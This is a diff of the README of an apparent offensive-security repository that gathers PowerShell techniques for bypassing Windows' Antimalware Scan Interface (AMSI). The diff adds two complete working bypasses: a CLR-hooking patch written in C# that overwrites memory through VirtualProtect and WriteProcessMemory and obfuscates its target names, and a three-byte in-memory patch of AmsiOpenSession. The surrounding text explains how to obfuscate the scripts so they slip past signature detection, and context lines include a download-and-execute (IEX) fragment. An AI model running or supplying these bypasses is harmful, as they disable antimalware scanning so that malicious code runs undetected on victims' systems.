@@ -1,25 +1,123 @@
+# Sponsored by
+
+[<img src="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/raw/master/images/happy_alp.png" width="300" height="300">](https://www.bluebastion.net/) &emsp; &emsp; &emsp;
+[<img src="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/raw/master/images/Kovert.png" width="250" height="250">](https://kovert.no/)
+
 # Amsi-Bypass-Powershell #
 This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts.
 
 Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. You can also take a look at my [blog post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about manually changing the signature to get a valid bypass again.
 
+0. [Using CLR hooking](#Using-CLR-hooking "Goto Using-CLR-hooking")
 1. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
 2. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
-3. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
-4. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
-5. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
-6. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
-7. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
-8. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
-9. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
-10. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
-11. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
-12. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
-13. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
-14. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
-15. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
-16. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
-17. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+3. [Patching AMSI AmsiScanBuffer by rasta-mouse](#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
+4. [Patching AMSI AmsiOpenSession](#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
+5. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+6. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+7. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
+8. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
+9. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+10. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+11. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+12. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+13. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+14. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+15. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+16. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+17. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+18. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+
+# Using CLR hooking
+- Source: [https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)
+
+```
+
+$code = @"
+using System;
+using System.ComponentModel;
+using System.Management.Automation;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Text;
+namespace Editor {
+    public static class Methods {
+        public static void Patch() {
+            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
+            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
+            Methods.Patch(original, replacement);
+        }
+        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
+        private static int Dummy(string content, string metadata) {
+            return 1;
+        }
+        public static void Patch(MethodInfo original, MethodInfo replacement) {
+            //JIT compile methods
+            RuntimeHelpers.PrepareMethod(original.MethodHandle);
+            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
+            //Get pointers to the functions
+            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
+            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
+            //Generate architecture specific shellcode
+            byte[] patch = null;
+            if (IntPtr.Size == 8) {
+                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
+                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
+                for (int i = 0; i < address.Length; i++) {
+                    patch[i + 2] = address[i];
+                }
+            } else {
+                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
+                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
+                for (int i = 0; i < address.Length; i++) {
+                    patch[i + 1] = address[i];
+                }
+            }
+            //Temporarily change permissions to RWE
+            uint oldprotect;
+            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
+                throw new Win32Exception();
+            }
+            //Apply the patch
+            IntPtr written = IntPtr.Zero;
+            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
+                throw new Win32Exception();
+            }
+            //Flush insutruction cache to make sure our new code executes
+            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
+                throw new Win32Exception();
+            }
+            //Restore the original memory protection settings
+            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
+                throw new Win32Exception();
+            }
+        }
+        private static string Transform(string input) {
+            StringBuilder builder = new StringBuilder(input.Length + 1);    
+            foreach(char c in input) {
+                char m = (char)((int)c - 1);
+                builder.Append(m);
+            }
+            return builder.ToString();
+        }
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetCurrentProcess();
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
+        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
+    }
+}
+"@
+Add-Type $code
+[Editor.Methods]::Patch()
+
+```
 
 # Patch the providers DLL of Microsoft MpOav.dll #
 - Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf), author: Maor Korkos (@maorkor)
@@ -235,7 +333,7 @@ while ($AntimalwareProvider -ne 0)
 }
 ```
 
-# Patching amsi.dll AmsiScanBuffer by rasta-mouse #
+# Patching AMSI AmsiScanBuffer by rasta-mouse #
 ```
 $Win32 = @"
 
@@ -279,6 +377,50 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
     $content=$reader.ReadToEnd()
 
     IEX($content)
+
+
+# Patching AMSI AmsiOpenSession
+```
+# Author: Matheus Alexandre, https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
+function lookFuncAddr{
+Param($moduleName, $functionName)
+
+$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+$tmp=@()
+$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
+return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType{
+Param(
+[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+[Parameter(Position = 1)] [Type] $delType = [Void]
+)
+
+$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
+'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+return $type.CreateType()
+}
+
+[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
+$oldProtect = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
+(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+
+$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)
+
+$3b = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
+
+$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
+```
+
 
 # The Short version of dont use powershell net webclient - Not Working anymore, there was a patch for it
 ```
